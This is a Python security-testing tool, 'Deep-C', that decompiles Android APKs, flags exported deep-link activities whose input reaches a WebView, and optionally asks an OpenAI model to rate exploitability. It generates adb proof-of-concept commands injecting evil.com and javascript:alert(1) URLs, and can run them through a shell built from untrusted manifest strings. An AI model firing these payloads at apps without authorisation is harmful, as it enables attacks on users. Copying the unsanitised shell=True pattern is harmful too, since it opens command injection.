import xml.etree.ElementTree as ET
import subprocess
import argparse
import os
import shutil
import sys
import json
import re

# ===================== AI IMPORT (OPTIONAL) ===================== #
try:
    from openai import OpenAI
except ImportError:
    OpenAI = None

# ===================== CONSTANTS ===================== #

ANDROID_NS = "{http://schemas.android.com/apk/res/android}"

OUT_DIR = "deepc_out"
APKTOOL_DIR = os.path.join(OUT_DIR, "apktool")
DEX_DIR = os.path.join(OUT_DIR, "dex")
SRC_DIR = os.path.join(OUT_DIR, "src")

# ===================== DETECTION RULES ===================== #

RISK_PATTERNS = {
    "INTENT_DATA": [
        r"intent\.getData\(",
        r"getIntent\(",
        r"getData\(",
    ],
    "QUERY_PARAM": [
        r"getQueryParameter\(",
    ],
    "WEBVIEW_SINK": [
        r"loadUrl\(",
    ]
}

WEAK_VALIDATION_PATTERNS = [
    r"endsWith\(",
    r"contains\(",
    r"matches\(",
]

SAFE_STRONG_PATTERNS = [
    r"Uri\.getHost\(\)\.equals",
    r"equals\(\"https://",
]

# ===================== BANNER ===================== #

def banner():
    print(r"""
██████╗ ███████╗███████╗██████╗       ██████╗
██╔══██╗██╔════╝██╔════╝██╔══██╗     ██╔════╝
██║  ██║█████╗  █████╗  ██████╔╝     ██║     
██║  ██║██╔══╝  ██╔══╝  ██╔═══╝      ██║     
██████╔╝███████╗███████╗██║          ╚██████╗
╚═════╝ ╚══════╝╚══════╝╚═╝           ╚═════╝

 Deep-C | Android Deep Link Exploitation Framework by @ Kishor Balan
 Decompile • Detect • Validate • Exploit
 Usage:
 Normal Scan: python3 deepc.py -a target.apk
 AI based analysis: python3 deepc.py -a target.apk --ai-review
""")

# ===================== HELPERS ===================== #

def run(cmd, msg):
    print(f"[*] {msg}")
    subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def clean_dirs():
    if os.path.exists(OUT_DIR):
        shutil.rmtree(OUT_DIR)
    os.makedirs(OUT_DIR)

# ===================== APK PROCESSING ===================== #

def decompile_apk(apk):
    run(["apktool", "d", apk, "-o", APKTOOL_DIR, "-f"], "Decompiling APK with apktool")
    manifest = os.path.join(APKTOOL_DIR, "AndroidManifest.xml")
    if not os.path.exists(manifest):
        sys.exit("[-] AndroidManifest.xml not found")
    return manifest

def dex_to_jar():
    os.makedirs(DEX_DIR, exist_ok=True)
    dex = os.path.join(APKTOOL_DIR, "classes.dex")
    jar = os.path.join(DEX_DIR, "app.jar")
    run(["d2j-dex2jar", dex, "-o", jar], "Converting DEX to JAR (dex2jar)")
    return jar

def decompile_jar(jar):
    run(["jadx", "-d", SRC_DIR, jar], "Decompiling JAR to Java source (jadx)")

# ===================== MANIFEST PARSING ===================== #

def parse_manifest(path):
    tree = ET.parse(path)
    root = tree.getroot()
    return root, root.attrib.get("package")

def is_exported(component):
    exported = component.attrib.get(ANDROID_NS + "exported")
    if exported is None:
        return component.find("intent-filter") is not None
    return exported.lower() == "true"

def extract_deeplinks(activity):
    deeplinks = []
    for intent in activity.findall("intent-filter"):
        actions = [a.attrib.get(ANDROID_NS + "name") for a in intent.findall("action")]
        cats = [c.attrib.get(ANDROID_NS + "name") for c in intent.findall("category")]

        if "android.intent.action.VIEW" not in actions:
            continue
        if "android.intent.category.BROWSABLE" not in cats:
            continue

        for data in intent.findall("data"):
            deeplinks.append({
                "scheme": data.attrib.get(ANDROID_NS + "scheme"),
                "host": data.attrib.get(ANDROID_NS + "host"),
                "path": data.attrib.get(ANDROID_NS + "path")
                        or data.attrib.get(ANDROID_NS + "pathPrefix")
                        or data.attrib.get(ANDROID_NS + "pathPattern")
            })
    return deeplinks

# ===================== SOURCE ANALYSIS ===================== #

def find_activity_source(activity):
    name = activity.split(".")[-1] + ".java"
    for root, _, files in os.walk(SRC_DIR):
        if name in files:
            return os.path.join(root, name)
    return None

def analyze_source(path):
    if not path or not os.path.exists(path):
        return {"confidence": "MEDIUM", "reason": "Source not resolved"}

    with open(path, "r", errors="ignore") as f:
        code = f.read()

    found = set()
    weak = []
    strong_safe = False

    for key, patterns in RISK_PATTERNS.items():
        for p in patterns:
            if re.search(p, code):
                found.add(key)

    for p in WEAK_VALIDATION_PATTERNS:
        if re.search(p, code):
            weak.append(p)

    for p in SAFE_STRONG_PATTERNS:
        if re.search(p, code):
            strong_safe = True

    exploitable = (
        "WEBVIEW_SINK" in found and
        ("INTENT_DATA" in found or "QUERY_PARAM" in found)
    )

    if not exploitable:
        return None

    if strong_safe:
        confidence = "LOW"
    elif weak:
        confidence = "HIGH"
    else:
        confidence = "MEDIUM"

    return {
        "confidence": confidence,
        "found_patterns": list(found),
        "weak_validation": weak,
        "code": code[:6000]  # limit for AI
    }

# ===================== AI REVIEW ===================== #

def build_ai_prompt(code, deeplink):
    return f"""
You are an Android application security reviewer.

Analyze the following activity source code and deep link information.
Determine whether attacker-controlled input can reach a WebView
or other sensitive sink.

Respond ONLY in valid JSON with:
- exploitability: true or false
- confidence: HIGH, MEDIUM, or LOW
- reasoning: one short sentence

[ACTIVITY CODE]
{code}

[DEEPLINK INFO]
{deeplink}
"""
def ai_review(code, deeplink):
    if not os.getenv("OPENAI_API_KEY"):
        print("[!] OPENAI_API_KEY not set, skipping AI review")
        return None

    try:
        client = OpenAI()

        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=[
                {"role": "system", "content": "You are a strict Android security reviewer."},
                {"role": "user", "content": build_ai_prompt(code, deeplink)}
            ],
            temperature=0
        )

        raw = response.choices[0].message.content
        print("[*] AI response:", raw)   # TEMP DEBUG

        return json.loads(raw)

    except Exception as e:
        print(f"[!] AI review failed: {e}")
        return None

def merge_confidence(static_conf, ai_result):
    if not ai_result:
        return static_conf

    if static_conf == "HIGH":
        return "HIGH"

    if static_conf == "MEDIUM":
        if ai_result["exploitability"] and ai_result["confidence"] == "HIGH":
            return "HIGH"
        return "MEDIUM"

    return "LOW"

# ===================== POC GENERATION ===================== #

def build_deeplink_url(deeplink, path, query):
    scheme = deeplink.get("scheme")
    host = deeplink.get("host")

    if scheme in ["http", "https"]:
        base = f"{scheme}://{host}" if host else f"{scheme}://evil.com"
    else:
        base = f"{scheme}://{host}" if host else f"{scheme}://"

    return f"{base}{path}?{query}"

def generate_pocs(pkg, activity, deeplink):
    path = deeplink.get("path") or "/"

    return [
        f'adb shell am start -a android.intent.action.VIEW -d "{build_deeplink_url(deeplink, path, "url=https://evil.com")}"',
        f'adb shell am start -a android.intent.action.VIEW -d "{build_deeplink_url(deeplink, path, "url=javascript:alert(1)")}"',
        f'adb shell am start -n {pkg}/{activity}'
    ]

# ===================== MAIN ===================== #

def main():
    banner()

    parser = argparse.ArgumentParser()
    parser.add_argument("-a", "--apk", required=True)
    parser.add_argument("--exec", action="store_true")
    parser.add_argument("--ai-review", action="store_true")
    args = parser.parse_args()

    clean_dirs()
    manifest = decompile_apk(args.apk)
    jar = dex_to_jar()
    decompile_jar(jar)

    root, package = parse_manifest(manifest)
    print(f"[+] Package: {package}\n")

    results = {"package": package, "findings": []}

    for app in root.findall("application"):
        for act in app.findall("activity"):
            name = act.attrib.get(ANDROID_NS + "name")
            if not name or not is_exported(act):
                continue

            deeplinks = extract_deeplinks(act)
            if not deeplinks:
                continue

            src = find_activity_source(name)
            analysis = analyze_source(src)
            if not analysis:
                continue

            for dl in deeplinks:
                static_conf = analysis["confidence"]
                final_conf = static_conf
                ai_data = None

                if args.ai_review:
                    ai_data = ai_review(analysis.get("code", ""), dl)
                    final_conf = merge_confidence(static_conf, ai_data)

                print("[+] Vulnerable Activity Found")
                print(f"    Activity   : {name}")
                print(f"    Confidence : {final_conf}")
                if ai_data:
                    print(f"    AI Verdict : {ai_data['confidence']} - {ai_data['reasoning']}")

                pocs = generate_pocs(package, name, dl)
                print("    PoCs:")
                for p in pocs:
                    print(f"      {p}")
                    if args.exec:
                        subprocess.run(p, shell=True)

                results["findings"].append({
                    "activity": name,
                    "deeplink": dl,
                    "confidence": final_conf,
                    "static_confidence": static_conf,
                    "ai_review": ai_data,
                    "pocs": pocs
                })

                print("-" * 70)

    with open("deepc_result.json", "w") as f:
        json.dump(results, f, indent=4)

    print("\n[+] Results saved to deepc_result.json")

if __name__ == "__main__":
    main()
